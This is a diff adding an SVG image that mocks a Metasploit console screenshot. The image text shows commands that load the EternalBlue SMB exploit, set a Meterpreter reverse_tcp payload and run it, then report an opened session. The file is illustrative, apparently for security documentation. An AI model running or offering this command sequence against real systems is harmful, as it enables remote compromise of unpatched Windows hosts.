@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 400" role="img" aria-labelledby="title desc">
+<title>Metasploit exploitation console screenshot</title>
+<desc>Mocked Metasploit console output with payload execution and session establishment.</desc>
+<rect width="720" height="400" rx="24" fill="#111827"/>
+<rect x="32" y="32" width="656" height="48" rx="12" fill="#1f2937"/>
+<circle cx="64" cy="56" r="8" fill="#ef4444"/>
+<circle cx="96" cy="56" r="8" fill="#f59e0b"/>
+<circle cx="128" cy="56" r="8" fill="#10b981"/>
+<rect x="40" y="96" width="640" height="280" rx="16" fill="#111827" stroke="#374151" stroke-width="2"/>
+<text x="64" y="132" fill="#d1d5db" font-family="Courier New, monospace" font-size="18">msfconsole -q</text>
+<text x="64" y="162" fill="#9ca3af" font-family="Courier New, monospace" font-size="16">use exploit/windows/smb/ms17_010_eternalblue</text>
+<text x="64" y="192" fill="#d1d5db" font-family="Courier New, monospace" font-size="16">set PAYLOAD windows/x64/meterpreter/reverse_tcp</text>
+<text x="64" y="222" fill="#d1d5db" font-family="Courier New, monospace" font-size="16">run</text>
+<text x="64" y="252" fill="#34d399" font-family="Courier New, monospace" font-size="16">[*] Meterpreter session 1 opened</text>
+<text x="64" y="292" fill="#c7d2fe" font-family="Arial, sans-serif" font-size="16">Outcome: exploited target and established persistent session for analysis.</text>
+</svg>
